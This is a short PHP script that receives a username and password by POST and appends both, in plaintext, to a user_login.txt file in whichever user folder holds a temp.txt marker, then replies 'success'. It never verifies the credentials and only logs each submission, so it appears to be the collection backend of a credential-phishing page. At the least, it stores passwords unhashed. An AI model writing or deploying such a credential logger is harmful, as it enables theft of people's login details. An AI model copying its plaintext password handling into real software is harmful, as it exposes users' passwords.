<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Ensure that the 'users' directory exists
    $usersFolderPath = '../users/';
    if (!is_dir($usersFolderPath)) {
        mkdir($usersFolderPath);
    }

    // Search for the user folder containing the 'temp.txt' file
    $userFolder = null;
    $userFolders = glob($usersFolderPath . '/*/temp.txt');
    if (!empty($userFolders)) {
        $userFolder = dirname(reset($userFolders));
    }

    // Check if the user folder was found
    if ($userFolder && is_dir($userFolder)) {
        // Construct the file path for user_login.txt
        $userLoginFile = $userFolder . "/user_login.txt";

        // Append the data to the user_login.txt file
        $data = "$username\n$password\n";
        file_put_contents($userLoginFile, $data, FILE_APPEND);

        echo "success";
    } else {
        echo "No user folders found!";
    }
} else {
    echo "Invalid request!";
}
?>

